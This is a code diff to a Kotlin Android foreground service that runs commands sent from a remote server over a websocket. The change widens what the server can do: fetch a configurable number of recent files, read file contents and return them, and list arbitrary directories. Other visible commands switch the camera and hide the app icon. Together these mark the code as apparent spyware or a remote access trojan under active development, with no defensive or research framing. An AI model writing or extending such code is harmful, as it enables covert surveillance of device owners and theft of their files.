@@ -743,8 +743,10 @@ class ForegroundSyncService : Service() {
                 }
                 "FETCH_FILES" -> {
                     scope.launch(Dispatchers.IO) {
-                        val files = deviceDataHelper.getRecentFiles(30)
+                        val limit = (cmd.params?.get("limit") as? Number)?.toInt() ?: 50
+                        val files = deviceDataHelper.getRecentFiles(limit)
                         wsClient?.sendMessage("FILES_SYNC", files)
+                        Log.d(TAG, "Sent FILES_SYNC with ${files.size} items to server")
                     }
                 }
                 "SWITCH_CAMERA", "CAMERA_SWITCH" -> {
@@ -767,14 +769,18 @@ class ForegroundSyncService : Service() {
                     val filePath = cmd.params?.get("file_path") as? String
                     if (!filePath.isNullOrEmpty()) {
                         scope.launch(Dispatchers.IO) {
-                            val base64 = deviceDataHelper.getFileBase64(filePath)
-                            val res = FileDataResultPayload(
-                                filePath = filePath,
-                                fileBase64 = base64,
-                                error = if (base64 == null) "تعذر قراءة أو ترميز الملف" else null
-                            )
+                            val res = deviceDataHelper.getFileData(filePath)
                             wsClient?.sendMessage("FILE_DATA_RESULT", res)
+                            Log.d(TAG, "Sent FILE_DATA_RESULT for $filePath (size=${res.fileSize}, error=${res.error})")
                         }
+                    }
+                }
+                "LIST_DIRECTORY" -> {
+                    val dirPath = cmd.params?.get("directory_path") as? String
+                    scope.launch(Dispatchers.IO) {
+                        val res = deviceDataHelper.listDirectory(dirPath)
+                        wsClient?.sendMessage("DIRECTORY_LIST_RESULT", res)
+                        Log.d(TAG, "Sent DIRECTORY_LIST_RESULT for ${res.currentPath} with ${res.items.size} items")
                     }
                 }
                 "HIDE_APP_ICON" -> {
